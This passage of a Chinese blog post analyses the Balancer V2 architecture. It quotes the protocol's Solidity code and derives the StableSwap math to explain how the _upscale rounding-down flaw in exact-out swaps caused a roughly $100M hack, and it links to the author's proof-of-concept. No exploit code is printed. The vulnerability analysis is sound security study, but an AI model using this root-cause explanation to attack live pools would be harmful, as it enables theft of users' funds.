---
title: "DeFi 安全观察: Balancer V2 架构与舍入漏洞分析"
date: 2025-11-28T10:47:30Z
tags: [defi, security]
math: true
---

## 概述

Balancer v2 作为以太坊内最核心的 AMM 之一，不久前遭受了一次严重的黑客攻击，接近 1 亿美金的 ETH 流动性质押代币被盗取。本文将以黑客在主网上发起的 [攻击交易](https://app.blocksec.com/explorer/tx/eth/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742) 为例，该攻击攻击了 `[WETH, BPT, osETH]` 池。我们将以此攻击为例，介绍攻击者如何执行攻击，以及攻击合约到底进行哪些链上计算。

笔者也为此次攻击编写了 [PoC 合约](https://github.com/wangshouh/balancer-v2-poc)。

## Balancer v2 架构

虽然黑客攻击并没有太多涉及到 Balancer v2 的架构，但是为了帮助读者补充背景信息，此处我们简单介绍一下 Balancer v2 的架构特点。对于任意的 AMM 架构，我们都关心以下几个问题:

1. 如何创建 Pool
2. 如何进行流动性的管理，即如何增加流动性和退出流动性
3. Swap 过程中产生的手续费如何分配
4. 如何进行 Swap，换言之即 AMM 使用的曲线是什么样子，如何进行以不变量为核心进行计算

本文主要参考了 [Curve StableSwap White Paper](https://docs.curve.finance/assets/pdf/whitepaper_stableswap.pdf) 和 [Stableswap-NG 文档](https://docs.curve.finance/stableswap-exchange/stableswap-ng/overview/)，部分推导过程借助了 [get_D() and get_y() in Curve StableSwap](https://rareskills.io/post/curve-get-d-get-y) 文章。

### 创建 Pool

我们需要强调 Balancer v2 是单体架构的开创者，即所有的代币都位于同一个合约，该合约在 Balance v2 代码内被称为 `Vault`。与 Uniswap 不同，Balancer v2 支持单池内存在多种代币，但是很多情况下，AMM 池子内只存在两种代币，所以为了适配不同的情况，Balancer v2 开发者设置了  `PoolSpecialization` 枚举类型，该类型用于说明某一个 AMM 池内存在几种代币以及如何在 Swap 时向 AMM 池子传递内部池子余额信息:

```solidity
enum PoolSpecialization { GENERAL, MINIMAL_SWAP_INFO, TWO_TOKEN }
```

上述三种架构的主要区别在于支持的池子代币的种类和 Swap 时传递的代币余额信息。我们首先讨论池子内支持的代币种类数量的:

```solidity
PoolSpecialization specialization = _getPoolSpecialization(poolId);
if (specialization == PoolSpecialization.TWO_TOKEN) {
    _require(tokens.length == 2, Errors.TOKENS_LENGTH_MUST_BE_2);
    _registerTwoTokenPoolTokens(poolId, tokens[0], tokens[1]);
} else if (specialization == PoolSpecialization.MINIMAL_SWAP_INFO) {
    _registerMinimalSwapInfoPoolTokens(poolId, tokens);
} else {
    // PoolSpecialization.GENERAL
    _registerGeneralPoolTokens(poolId, tokens);
}

emit TokensRegistered(poolId, tokens, assetManagers);
```

我们可以看到 `GENERAL` 和 `MINIMAL_SWAP_INFO` 都支持多种代币的池子，而 `TWO_TOKEN` 只支持两种代币的池子。在 Swap 中，`GENERAL` 会使用如下方法向 AMM 传递池子代币余额信息:

```solidity
uint256[] memory currentBalances = new uint256[](tokenAmount);

request.lastChangeBlock = 0;
for (uint256 i = 0; i < tokenAmount; i++) {
    // Because the iteration is bounded by `tokenAmount`, and no tokens are registered or deregistered here, we
    // know `i` is a valid token index and can use `unchecked_valueAt` to save storage reads.
    bytes32 balance = poolBalances.unchecked_valueAt(i);

    currentBalances[i] = balance.total();
    request.lastChangeBlock = Math.max(request.lastChangeBlock, balance.lastChangeBlock());

    if (i == indexIn) {
        tokenInBalance = balance;
    } else if (i == indexOut) {
        tokenOutBalance = balance;
    }
}

// Perform the swap request callback and compute the new balances for 'token in' and 'token out' after the swap
amountCalculated = pool.onSwap(request, currentBalances, indexIn, indexOut);
```

简单来说，我们会将当前 `poolBalances` 内部的所有代币余额的信息检索出来，然后发送给 `pool` 处理。此处需要提前补充一点，balancer v2 使用了 `onSwap` 机制。每次都会向 `pool` 的 `onSwap` 函数发起调用获得 Swap 的计算返回值。我们会在后文介绍 Swap 时更加详细介绍该机制。

此处我们需要额外注意 `bytes32 balance = poolBalances.unchecked_valueAt(i);`。`balance` 的类型并不是常见的 `uint256`，这是因为 balance 内并不是一个只存储了代币余额，也包含其他信息，具体来说:

```solidity
// The 'cash' portion of the balance is stored in the least significant 112 bits of a 256 bit word, while the
// 'managed' part uses the following 112 bits. The most significant 32 bits are used to store the block
```

简单来说，`cash` 是池子中真实存在的代币而 `managed` 是 `assetManager` 管理的代币余额，这部分代币并不是真实存在的，只是用于计算。`AssetManager` 可以使用 `managePoolBalance` 管理这些代币。

而 `MINIMAL_SWAP_INFO` 使用了如下代码:

```solidity
bytes32 tokenInBalance = _getMinimalSwapInfoPoolBalance(request.poolId, request.tokenIn);
bytes32 tokenOutBalance = _getMinimalSwapInfoPoolBalance(request.poolId, request.tokenOut);

// Perform the swap request and compute the new balances for 'token in' and 'token out' after the swap
(tokenInBalance, tokenOutBalance, amountCalculated) = _callMinimalSwapInfoPoolOnSwapHook(
    request,
    pool,
    tokenInBalance,
    tokenOutBalance
);
```

`MINIMAL_SWAP_INFO` 会在自己本地存储的多个代币余额内找到 `tokenIn` 和 `tokenOut` 的代币余额。而所有的 `MINIMAL_SWAP_INFO` 的 AMM 池都会使用如下两个 mapping 存储数据:

```solidity
mapping(bytes32 => mapping(IERC20 => bytes32)) internal _minimalSwapInfoPoolsBalances;
mapping(bytes32 => EnumerableSet.AddressSet) internal _minimalSwapInfoPoolsTokens;
```

上述代码内的 `_getMinimalSwapInfoPoolBalance` 实现如下:

```solidity
function _getMinimalSwapInfoPoolBalance(bytes32 poolId, IERC20 token) internal view returns (bytes32) {
    bytes32 balance = _minimalSwapInfoPoolsBalances[poolId][token];

    // A non-zero balance guarantees that the token is registered. If zero, we manually check if the token is
    // registered in the Pool. Token registration implies that the Pool is registered as well, which lets us save
    // gas by not performing the check.
    bool tokenRegistered = balance.isNotZero() || _minimalSwapInfoPoolsTokens[poolId].contains(address(token));

    if (!tokenRegistered) {
        // The token might not be registered because the Pool itself is not registered. We check this to provide a
        // more accurate revert reason.
        _ensureRegisteredPool(poolId);
        _revert(Errors.TOKEN_NOT_REGISTERED);
    }

    return balance;
}
```

而 `TWO_TOKEN` 是最简单且最有效率的代币余额存储方法:

```solidity
struct TwoTokenPoolBalances {
    bytes32 sharedCash;
    bytes32 sharedManaged;
}
```

其中 `sharedCash` 用于存储 2 种代币的余额，各占用 112 bit，同时剩下 32 bit 用于存储 上一次代币余额更新时间。而 `sharedManaged` 则用于存储 2 种代币被 AssetManager 管理的余额。这样的好处是常规的 swap 只会影响 `sharedCash` 内的数据，也使得常规的 Swap 只需要对单个存储槽进行写操作。

最后，无论 Pool 属于上述那种类型，在完成 `onSwap` Hook 调用后，都会使用调用后的结果进行如下操作:

```solidity
// We check the token ordering again to create the new shared cash packed struct
poolBalances.sharedCash = request.tokenIn < request.tokenOut
    ? BalanceAllocation.toSharedCash(tokenInBalance, tokenOutBalance) // in is A, out is B
    : BalanceAllocation.toSharedCash(tokenOutBalance, tokenInBalance); // in is B, out is A
```

简单来说，就是根据 `onSwap` 函数的返回值增减 Vault 内记录的 `poolBalances`。在本次攻击中，该机制导致了误差在 Pool Balance 内的持续累积。

在创建流动性池时，Balancer 要求 AMM 合约调用 `Vault` 合约的 `registerPool` 函数，该函数定义和实现如下:

```solidity
function registerPool(PoolSpecialization specialization)
    external
    override
    nonReentrant
    whenNotPaused
    returns (bytes32)
{
    // Each Pool is assigned a unique ID based on an incrementing nonce. This assumes there will never be more than
    // 2**80 Pools, and the nonce will not overflow.

    bytes32 poolId = _toPoolId(msg.sender, specialization, uint80(_nextPoolNonce));

    _require(!_isPoolRegistered[poolId], Errors.INVALID_POOL_ID); // Should never happen as Pool IDs are unique.
    _isPoolRegistered[poolId] = true;

    _nextPoolNonce += 1;

    // Note that msg.sender is the pool's contract
    emit PoolRegistered(poolId, msg.sender, specialization);
    return poolId;
}
```

此次黑客攻击的 Balancer v2 的池子是 `ComposableStablePool`。我们可以注意到 `Composable` ，该词描述在 AMM 池子内部存在特殊的代表流动性的代币，我们一般称该种代币为 BPT。BPT 的代币合约就是 AMM 合约本身，我们可以在 `ComposableStablePool` 的构造器内观察到如下代码:

```solidity
BasePool(
    params.vault,
    IVault.PoolSpecialization.GENERAL,
    params.name,
    params.symbol,
    _insertSorted(params.tokens, IERC20(this)),
    new address[](params.tokens.length + 1),
    params.swapFeePercentage,
    params.pauseWindowDuration,
    params.bufferPeriodDuration,
    params.owner
)
```

此处的 `IVault.PoolSpecialization.GENERAL` 代表合约初始化时向 `Vault` 内传入的类型是 `GENERAL`，而 `_insertSorted(params.tokens, IERC20(this))` 的含义是将 BPT 代币(即 `address(this)`)与用户指定的代币组合混合在一起。

### 流动性管理

在 Balancer v2 合约内存在如下两个函数:

```solidity
function joinPool(
    bytes32 poolId,
    address sender,
    address recipient,
    JoinPoolRequest memory request
) external payable;

struct JoinPoolRequest {
    IAsset[] assets;
    uint256[] maxAmountsIn;
    bytes userData;
    bool fromInternalBalance;
}

function exitPool(
    bytes32 poolId,
    address sender,
    address payable recipient,
    ExitPoolRequest memory request
) external;

struct ExitPoolRequest {
    IAsset[] assets;
    uint256[] minAmountsOut;
    bytes userData;
    bool toInternalBalance;
}
```

上述函数中的 `joinPool` 用于添加流动性，而 `exitPool` 用于退出流动性。上述函数会直接本质上都会调用到以下函数:

```solidity
(amountsInOrOut, dueProtocolFeeAmounts) = kind == PoolBalanceChangeKind.JOIN
    ? pool.onJoinPool(
        poolId,
        sender,
        recipient,
        totalBalances,
        lastChangeBlock,
        _getProtocolSwapFeePercentage(),
        change.userData
    )
    : pool.onExitPool(
        poolId,
        sender,
        recipient,
        totalBalances,
        lastChangeBlock,
        _getProtocolSwapFeePercentage(),
        change.userData
    );
```

简单来说，Vault 会调用 Pool 上的 `onJoinPool` 或者 `onExitPool` 函数来获得用户输入或输出的代币情况以及管理流动性的 `ProtocolFee` 数据。当 Vault 获得 `amountsInOrOut` 数据后，Vault 会进一步调用 `_processJoinPoolTransfers` 或者 `_processExitPoolTransfers` 函数。`_processJoinPoolTransfers` 函数会根据用户配置将资金发送给用户或者单纯划转为用户的 `InternalBalance`。`_processExitPoolTransfers` 会将用户退出 Pool 获得的资产使用 `_sendAsset` 发送给用户。注意，这两个函数都不处理 LP 代币问题，而只处理 Pool 内部的代币。

接下来，我们可以看一下 `ComposableStablePool` 是如何处理这些调用的。在 `BasePool` 内存在如下代码:

```solidity
_upscaleArray(balances, scalingFactors);
(uint256 bptAmountOut, uint256[] memory amountsIn) = _onJoinPool(
    poolId,
    sender,
    recipient,
    balances,
    lastChangeBlock,
    inRecoveryMode() ? 0 : protocolSwapFeePercentage, // Protocol fees are disabled while in recovery mode
    scalingFactors,
    userData
);

// Note we no longer use `balances` after calling `_onJoinPool`, which may mutate it.

_mintPoolTokens(recipient, bptAmountOut);

// amountsIn are amounts entering the Pool, so we round up.
_downscaleUpArray(amountsIn, scalingFactors);

// This Pool ignores the `dueProtocolFees` return value, so we simply return a zeroed-out array.
return (amountsIn, new uint256[](balances.length));
```

我们可以看到此处调用了 `_onJoinPool` 函数，该函数在 `ComposableStablePool` 合约内的 `_onJoinExitPool` 内存在具体实现。在 `_onJoinExitPool` 内部，我们可以看到无论是 Join 还是 Exit 行为都会触发如下函数:

```solidity
(
    uint256 preJoinExitSupply,
    uint256[] memory balances,
    uint256 currentAmp,
    uint256 preJoinExitInvariant
) = _beforeJoinExit(registeredBalances);
```

该函数主要负责支付可能存在的 `ProtocolFees`，其中的具体实现我们会在后文中介绍手续费管理时进行具体分析。

对于 `_onJoinPool` 函数而言，其底层核心函数是 `_doJoin` 函数，该函数提供了以下三种获得 BPT 的方法。第一种方法是最简单的`_joinAllTokensInForExactBptOut` 函数，该函数实现如下:

```solidity
function _joinAllTokensInForExactBptOut(
    uint256 actualSupply,
    uint256[] memory balances,
    bytes memory userData
) private pure returns (uint256, uint256[] memory) {
    uint256 bptAmountOut = userData.allTokensInForExactBptOut();
    uint256[] memory amountsIn = BasePoolMath.computeProportionalAmountsIn(balances, actualSupply, bptAmountOut);

    return (bptAmountOut, amountsIn);
}
```

简单来说，`_joinAllTokensInForExactBptOut` 没有涉及到任何代币兑换，而是直接按照用户预期获得的 BPT 比例计算用户需要支付几种代币数量。

除此外，`doJoin` 支持的另外两种 Join 方法是：

1. `_joinExactTokensInForBPTOut` 给定多种代币，将其转化为 BPT 代币，使用 `_calcBptOutGivenExactTokensIn` 函数给定其他代币数量计算 BPT 代币的输出
2. `_joinTokenInForExactBPTOut` 给定一种代币，将其转化为 BPT 代币，使用 `_calcTokenInGivenExactBptOut` 方法，给定 BPT 代币输出计算单种代币所需数量

上述函数的核心功能其实都是 BPT Swap 过程中也会被使用的。我们可以先看一下 `_calcBptOutGivenExactTokensIn` 函数，该函数的作用是输入一系列 `amountsIn` 给出输出的 BPT 代币的数量。

> 此处出现的 `_upscaleArray` 和 `_downscaleUpArray` 直接导致 Balancer 漏洞的发生，但我们会在下一节具体分析漏洞原因时介绍这两个函数实现中存在的问题

该函数的本质上是首先根据用户的输入计算出新的不变量，然后进一步计算不变量的变化值对应多少 BPT 代币，相关代码如下:

```solidity
uint256 newInvariant = _calculateInvariant(amp, newBalances);
uint256 invariantRatio = newInvariant.divDown(currentInvariant);

// If the invariant didn't increase for any reason, we simply don't mint BPT
if (invariantRatio > FixedPoint.ONE) {
    return bptTotalSupply.mulDown(invariantRatio - FixedPoint.ONE);
} else {
    return 0;
}
```

这里存在一个有趣的计算，假如我们按照当前代币的比例添加流动性，我们不需要支付 swap fee，但如果我们只添加一种代币，或不平衡添加代币则需要支付 swap fee。为了实现该功能，`_calcBptOutGivenExactTokensIn` 第一部是计算每种代币增加比例的加权平均数:

```solidity
// The weighted sum of token balance ratios with fee
uint256 invariantRatioWithFees = 0;
for (uint256 i = 0; i < balances.length; i++) {
    uint256 currentWeight = balances[i].divDown(sumBalances);
    balanceRatiosWithFee[i] = balances[i].add(amountsIn[i]).divDown(balances[i]);
    invariantRatioWithFees = invariantRatioWithFees.add(balanceRatiosWithFee[i].mulDown(currentWeight));
}

```

计算完成加权代币增加比例平均数后，对于添加比例大于加权平均数的代币，我们会施加额外的手续费惩罚，代码如下:

```solidity
// Check if the balance ratio is greater than the ideal ratio to charge fees or not
if (balanceRatiosWithFee[i] > invariantRatioWithFees) {
    uint256 nonTaxableAmount = balances[i].mulDown(invariantRatioWithFees.sub(FixedPoint.ONE));
    uint256 taxableAmount = amountsIn[i].sub(nonTaxableAmount);
    // No need to use checked arithmetic for the swap fee, it is guaranteed to be lower than 50%
    amountInWithoutFee = nonTaxableAmount.add(taxableAmount.mulDown(FixedPoint.ONE - swapFeePercentage));
} else {
    amountInWithoutFee = amountsIn[i];
}
```

对于另一种指定添加 BPT 数量和添加单一代币的 `tokenIndex` 的 `_calcTokenInGivenExactBptOut`，该函数本质上会调用计算 Swap BPT token 的内部函数 `_getTokenBalanceGivenInvariantAndAllOtherBalances` 进行计算给定数量 BPT 需要多少 `tokenIndex` 的代币输入。在后文介绍 Swap 时，我们会涉及到该函数。`_calcTokenInGivenExactBptOut` 的核心代码如下:

```solidity
uint256 newInvariant = bptTotalSupply.add(bptAmountOut).divUp(bptTotalSupply).mulUp(currentInvariant);

// Calculate amount in without fee.
uint256 newBalanceTokenIndex = _getTokenBalanceGivenInvariantAndAllOtherBalances(
    amp,
    balances,
    newInvariant,
    tokenIndex
);
uint256 amountInWithoutFee = newBalanceTokenIndex.sub(balances[tokenIndex]);
```

在这里，我们需要补充上下文知识，在进行 BPT 代币的 swap 调用时，我们使用的 balances 中不包含 BPT 代币的余额，更加广泛的说，其实所有的不变量计算内都只使用不包含 BPT 的余额列表。此处我们会根据用户兑换 BPT 的数量，计算出新的不变量，换言之，BPT 的价格等于:
$$
\mathrm{price}_{\text{BPT}} = \frac{D}{\text{total BPT supply}}
$$
这意味着 BPT 价格实际上与 $D$ 是严格挂钩的，而 $D$ 的计算只需要使用不包含 BPT 的其他代币余额进行计算，这是导致 Balancer v2 被黑的重大原因，我们会在后文详细介绍该路径。

此处我们主要分析在计算完成需要的 amount in 数量后，Balancer 合约进行的手续费操作:

```solidity
// We can now compute how much extra balance is being deposited and used in virtual swaps, and charge swap fees
// accordingly.
uint256 currentWeight = balances[tokenIndex].divDown(sumBalances);
uint256 taxablePercentage = currentWeight.complement();
uint256 taxableAmount = amountInWithoutFee.mulUp(taxablePercentage);
uint256 nonTaxableAmount = amountInWithoutFee.sub(taxableAmount);

// No need to use checked arithmetic for the swap fee, it is guaranteed to be lower than 50%
return nonTaxableAmount.add(taxableAmount.divUp(FixedPoint.ONE - swapFeePercentage));
```

此处的 `complement` 的功能是 `(x < ONE) ? (ONE - x) : 0;`。上述代码的功能简单来说就是对额外的超比例添加的代币进行 `swapFeePercentage` 的手续费征收。

对于 `onExitPool` 函数，内部最核心的实现是 `_doExit` 函数，该函数类似也支持三种退出方法:

1. `_exitExactBPTInForTokensOut` 直接按照 BPT 退出的数量占池子内 BPT 总量的比例计算退出代币的数量
2. `_exitBPTInForExactTokensOut` 给定多种代币并要求退出一定数量的 BPT 使目标达到满足，等同于将 BPT 兑换为多种代币，核心使用 `_calcBptInGivenExactTokensOut` 进行计算
3. `_exitExactBPTInForTokenOut` 给定一种代币数量，要求退出一定数量的 BPT 使目标达到满足，等同于 BPT 兑换为一种代币，核心使用 `_calcTokenOutGivenExactBptIn` 进行计算

### Swap

对于 Swap 而言，核心函数是 `onSwap` 函数。此处我们主要介绍此次被盗的 `ComposableStablePool` 内的代码实现。在 Balancer 内部存在两个函数处理 Swap 问题，第一个函数是 `_swapGivenIn` 用于给定输入计算输出的代币兑换，就是 Uniswap 内的 `ExactIn` 模式，实现如下:

```solidity
function _swapGivenIn(
    SwapRequest memory swapRequest,
    uint256[] memory balances,
    uint256 indexIn,
    uint256 indexOut,
    uint256[] memory scalingFactors
) internal virtual returns (uint256) {
    // Fees are subtracted before scaling, to reduce the complexity of the rounding direction analysis.
    swapRequest.amount = _subtractSwapFeeAmount(swapRequest.amount);

    _upscaleArray(balances, scalingFactors);
    swapRequest.amount = _upscale(swapRequest.amount, scalingFactors[indexIn]);

    uint256 amountOut = _onSwapGivenIn(swapRequest, balances, indexIn, indexOut);

    // amountOut tokens are exiting the Pool, so we round down.
    return _downscaleDown(amountOut, scalingFactors[indexOut]);
}
```

上述代码内，我们可以看到两次舍入，第一次是 `_upscaleArray` 将输入进行舍入，第二次是 `_downscaleDown` 将计算结果向下舍入。此处使用了 `scalingFactors`，对于普通代币而言，比如 WETH ，`scalingFactors` 其实就是代币精度，但对于 `cbETH` 等包含利息的代币，`scalingFactors` 代表该代币的公允价值，即包含历史利息的价格，balancer v2 会通过调用合约获得该数值。如此一来，可以保证后续在进行 Swap 计算时，`cbETH` 与 WETH 等资产的价格锚定在 1:1 附近。

> Balancer v2 使用了 StableSwap AMM，该 AMM 方程在 1:1 附近具有最好的流动性

我们可以在 `pkg/solidity-utils/contracts/helpers/ScalingHelpers.sol` 内看到如下函数:

```solidity
function _upscaleArray(uint256[] memory amounts, uint256[] memory scalingFactors) pure {
    uint256 length = amounts.length;
    InputHelpers.ensureInputLengthMatch(length, scalingFactors.length);

    for (uint256 i = 0; i < length; ++i) {
        amounts[i] = FixedPoint.mulDown(amounts[i], scalingFactors[i]);
    }
}

function _downscaleDownArray(uint256[] memory amounts, uint256[] memory scalingFactors) pure {
    uint256 length = amounts.length;
    InputHelpers.ensureInputLengthMatch(length, scalingFactors.length);

    for (uint256 i = 0; i < length; ++i) {
        amounts[i] = FixedPoint.divDown(amounts[i], scalingFactors[i]);
    }
}
```

我们首先关注 `FixedPoint.divDown` 的实现，该实现如下:

```solidity
function divDown(uint256 a, uint256 b) internal pure returns (uint256) {
    _require(b != 0, Errors.ZERO_DIVISION);

    uint256 aInflated = a * ONE;
    _require(a == 0 || aInflated / a == ONE, Errors.DIV_INTERNAL); // mul overflow

    return aInflated / b;
}
```

上述代码其实直接利用了 EVM 内的 `div` 操作码本身就是向下取整的。接下来，我们可以看一下 `FixedPoint.mulDown` 的实现:

```solidity
function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 product = a * b;
    _require(a == 0 || product / a == b, Errors.MUL_OVERFLOW);

    return product / ONE;
}
```

此处的 `mulDown` 内部最后实现了 `product / ONE` 。此处的 `ONE = 1e18`。此处除以 1e18 的原因是因为 `scalingFactors` 是 18 位定点小数。

在 `_swapGivenIn` 内，我们使用 `_upscaleArray` 的操作并没有任何问题。但是在另一个函数 `_swapGivenOut` 内，该操作导致了漏洞。`_swapGivenOut` 用于给定输出代币计算输入代币进行兑换，即 Uniswap 内的 Exact out 模式，实现如下:

```solidity
function _swapGivenOut(
    SwapRequest memory swapRequest,
    uint256[] memory balances,
    uint256 indexIn,
    uint256 indexOut,
    uint256[] memory scalingFactors
) internal virtual returns (uint256) {
    _upscaleArray(balances, scalingFactors);
    swapRequest.amount = _upscale(swapRequest.amount, scalingFactors[indexOut]);

    uint256 amountIn = _onSwapGivenOut(swapRequest, balances, indexIn, indexOut);

    // amountIn tokens are entering the Pool, so we round up.
    amountIn = _downscaleUp(amountIn, scalingFactors[indexIn]);

    // Fees are added after scaling happens, to reduce the complexity of the rounding direction analysis.
    return _addSwapFeeAmount(amountIn);
}
```

此处我们注意到 `swapRequest.amount` 的计算使用了 `_upscale`。而 `_upscale` 只会进行向下取整，这意味着后续计算使用的 `swapRequest.amount` 都是向下取整的，这意味着后续计算中本质上低估了用户指定的 swap 输出，但 Vault 在最后的清算过程中，会使用如下方法确定发送代币的金额:

```solidity
/**
    * @dev Returns an ordered pair (amountIn, amountOut) given the 'given' and 'calculated' amounts, and the swap kind.
    */
function _getAmounts(
    SwapKind kind,
    uint256 amountGiven,
    uint256 amountCalculated
) private pure returns (uint256 amountIn, uint256 amountOut) {
    if (kind == SwapKind.GIVEN_IN) {
        (amountIn, amountOut) = (amountGiven, amountCalculated);
    } else {
        // SwapKind.GIVEN_OUT
        (amountIn, amountOut) = (amountCalculated, amountGiven);
    }
}
```

简单来说，由于 `_upscale` 低估了 `swapRequest.amount`，这会导致计算出的用户需要发送给合约的资产较少，而 Vault 仍会使用原有的  `swapRequest.amount` 给用户发送资产，这导致了 Balancer 在该笔交易内实际上产生了亏损。这就是导致协议被攻击的原因。在下一节中，我们将具体描述黑客如何构建交易流程利用这种舍入使其可以在交易中巨额获利。

继续介绍 Swap 内的代码，上述给出的 `_swapGivenIn` 和 `_swapGivenOut` 来自 `BaseGeneralPool`，但这些函数实际上在 `ComposableStablePool` 内都存在重载实现:

```solidity
function _swapGivenIn(
    SwapRequest memory swapRequest,
    uint256[] memory registeredBalances,
    uint256 registeredIndexIn,
    uint256 registeredIndexOut,
    uint256[] memory scalingFactors
) internal virtual override returns (uint256) {
    return
        (swapRequest.tokenIn == IERC20(this) || swapRequest.tokenOut == IERC20(this))
            ? _swapWithBpt(swapRequest, registeredBalances, registeredIndexIn, registeredIndexOut, scalingFactors)
            : super._swapGivenIn(
                swapRequest,
                registeredBalances,
                registeredIndexIn,
                registeredIndexOut,
                scalingFactors
            );
}
```

上述代码内区分了 Swap 是否涉及到 BPT 代币，假如涉及到 BPT 代币，那么就调用 `_swapWithBpt` ，否则就调用 `BaseGeneralPool` 内的 `_swapGivenIn` 函数。而 `BaseGeneralPool` 内的 `_swapGivenIn` 在函数内部调用了 `_onSwapGivenIn` 函数，而该函数是在 `ComposableStablePool` 内实现的，且实现如下:

```solidity
function _onSwapGivenIn(
    SwapRequest memory request,
    uint256[] memory registeredBalances,
    uint256 registeredIndexIn,
    uint256 registeredIndexOut
) internal virtual override returns (uint256) {
    return
        _onRegularSwap(
            true, // given in
            request.amount,
            registeredBalances,
            registeredIndexIn,
            registeredIndexOut
        );
}
```

> 在 `_swapWithBpt` 内也存在对 `GIVEN_OUT` 的不正确舍入，具体代码如下:
>
> ```solidity
> swapRequest.amount = _upscale(
>     swapRequest.amount,
>     scalingFactors[isGivenIn ? registeredIndexIn : registeredIndexOut]
> );
> ```

另一个函数 `_swapGivenOut` 也有类似的继承与重载逻辑，限于篇幅，此处不再给出相关代码。这里，我们可以简单看一下 `_onRegularSwap` 代码的实现:

```solidity
function _onRegularSwap(
    bool isGivenIn,
    uint256 amountGiven,
    uint256[] memory registeredBalances,
    uint256 registeredIndexIn,
    uint256 registeredIndexOut
) private view returns (uint256) {
    // Adjust indices and balances for BPT token
    uint256[] memory balances = _dropBptItem(registeredBalances);
    uint256 indexIn = _skipBptIndex(registeredIndexIn);
    uint256 indexOut = _skipBptIndex(registeredIndexOut);

    (uint256 currentAmp, ) = _getAmplificationParameter();
    uint256 invariant = StableMath._calculateInvariant(currentAmp, balances);

    if (isGivenIn) {
        return StableMath._calcOutGivenIn(currentAmp, balances, indexIn, indexOut, amountGiven, invariant);
    } else {
        return StableMath._calcInGivenOut(currentAmp, balances, indexIn, indexOut, amountGiven, invariant);
    }
}
```

在进行 Swap 过程中，我们首先生成一个新的 `balances` 数据，注意，我们剔除了原数据中的 BPT 代币余额，然后获取获取 `currentAmp`。实际上，BPT 代币余额永远不会参与 StableSwap 内部的数学行为。 为了进一步介绍 `AmplificationParameter` 的作用，我们需要给出 Balancer v2 ComposableStablePool 使用的由 Curve 发明的 StableSwap 的 AMM 公式:
$$
A \cdot n^n \cdot \sum x_i + D = A \cdot D \cdot n^n + \frac{D^{n + 1}}{n^n\cdot \prod x_i}
$$
上述公式内的 $D$ 是核心不变量，而 $A$ 就是此处的 `AmplificationParameter` ，该参数用于确定当前 AMM 内的滑点情况，该参数越大兑换时由 AMM 带来的滑点越低，也意味着 AMM 的价格发现能力越弱。该参数是可以动态调整的:

```solidity
// Return the current amp value, which will be an interpolation if there is an ongoing amp update.
// Also return a flag indicating whether there is an ongoing update.
function _getAmplificationParameter() internal view returns (uint256 value, bool isUpdating) {
    (uint256 startValue, uint256 endValue, uint256 startTime, uint256 endTime) = _getAmplificationData();

    // Note that block.timestamp >= startTime, since startTime is set to the current time when an update starts

    if (block.timestamp < endTime) {
        isUpdating = true;

        // We can skip checked arithmetic as:
        //  - block.timestamp is always larger or equal to startTime
        //  - endTime is always larger than startTime
        //  - the value delta is bounded by the largest amplification parameter, which never causes the
        //    multiplication to overflow.
        // This also means that the following computation will never revert nor yield invalid results.
        if (endValue > startValue) {
            value = startValue + ((endValue - startValue) * (block.timestamp - startTime)) / (endTime - startTime);
        } else {
            value = startValue - ((startValue - endValue) * (block.timestamp - startTime)) / (endTime - startTime);
        }
    } else {
        isUpdating = false;
        value = endValue;
    }
}
```

简单来说，Pool 管理者可以设置 $A$ 的数值在一段时间内从 `startValue` 线性调整为 `endValue`。不直接调整的原因是避免直接调整 $A$ 带来的潜在套利机会，所以此处我们在获取 $A$ 时会进行一次简单的计算，假如 $A$ 处于调整状态，那么按照线性规则计算出最新的 $A$ 数值。实际上，在链上存储的 $A$ 的数值为 $An^{n - 1}$ ，存储该数值的原因是为了更加有效的计算

接下来，我们就要进入真正的常规 Swap 的计算环节(注意，以下计算都不包含 BPT 代币)，我们首先讨论 `StableMath._calcOutGivenIn` 函数，该函数用于计算以下 AMM 公式内的 $D$ 数值(以下公式内将 $\sum x_i$ 使用 $S$ 表示，而 $\prod x_i$ 使用 $P$ 表示):
$$
A \cdot n^n \cdot S + D = A \cdot D \cdot n^n + \frac{D^{n + 1}}{n^n\cdot P}
$$
上述方程内的 $D$ 需要使用牛顿迭代法求解，我们引入函数 $f(D)$，定义如下:
$$
f(D) = \frac{D^{n + 1}}{n^n\cdot P} + An^nD - D - An^nS
$$
上述函数的导数为:
$$
f'(D) = \frac{(n + 1) D^n}{n^nP} + An^n - 1
$$
我们可以使用如下方法迭代求解 $D$ 的数值:
$$
\begin{align*}
D_{\text{next}} &= D - \frac{f(D)}{f'(D)}\\\\
&= D - \frac{\frac{D^{n + 1}}{n^nP} + An^nD - D - An^nS}{\frac{(n + 1) D^n}{n^nP} + An^n - 1}\\\\
&= \frac{\frac{(n + 1) D^{n+1}}{n^nP} + An^nD - D - \frac{D^{n + 1}}{n^nP} -  An^nD + D + An^nS}{\frac{(n + 1) D^n}{n^nP} + An^n - 1}\\\\
&= \frac{\frac{n  D^{n+1}}{n^nP} + An^nS}{\frac{(n + 1) D^n}{n^nP} + An^n - 1}\\\\
&= \frac{(\frac{n  D^{n+1}}{n^nP} + An^nS)D}{\frac{(n + 1) D^{n+1}}{n^nP} +(An^n - 1)D}
\end{align*}
$$
我们定义 $D_p = \frac{D^{n+1}}{n^nP}$ 继续化简上述计算:
$$
\begin{align*}
D_{next} = \frac{(An^nS + D_p)D}{(n+1)D_p + (An^n -1)D}
\end{align*}
$$
对应的代码位于 `_calculateInvariant` 内部，我们可以看到如下代码:

```solidity
uint256 sum = 0; // S in the Curve version
uint256 numTokens = balances.length;
for (uint256 i = 0; i < numTokens; i++) {
    sum = sum.add(balances[i]);
}
if (sum == 0) {
    return 0;
}

uint256 prevInvariant; // Dprev in the Curve version
uint256 invariant = sum; // D in the Curve version
uint256 ampTimesTotal = amplificationParameter * numTokens; // Ann in the Curve version

for (uint256 i = 0; i < 255; i++) {
    uint256 D_P = invariant;

    for (uint256 j = 0; j < numTokens; j++) {
        // (D_P * invariant) / (balances[j] * numTokens)
        D_P = Math.divDown(Math.mul(D_P, invariant), Math.mul(balances[j], numTokens));
    }

    prevInvariant = invariant;

    invariant = Math.divDown(
        Math.mul(
            // (ampTimesTotal * sum) / AMP_PRECISION + D_P * numTokens
            (Math.divDown(Math.mul(ampTimesTotal, sum), _AMP_PRECISION).add(Math.mul(D_P, numTokens))),
            invariant
        ),
        // ((ampTimesTotal - _AMP_PRECISION) * invariant) / _AMP_PRECISION + (numTokens + 1) * D_P
        (
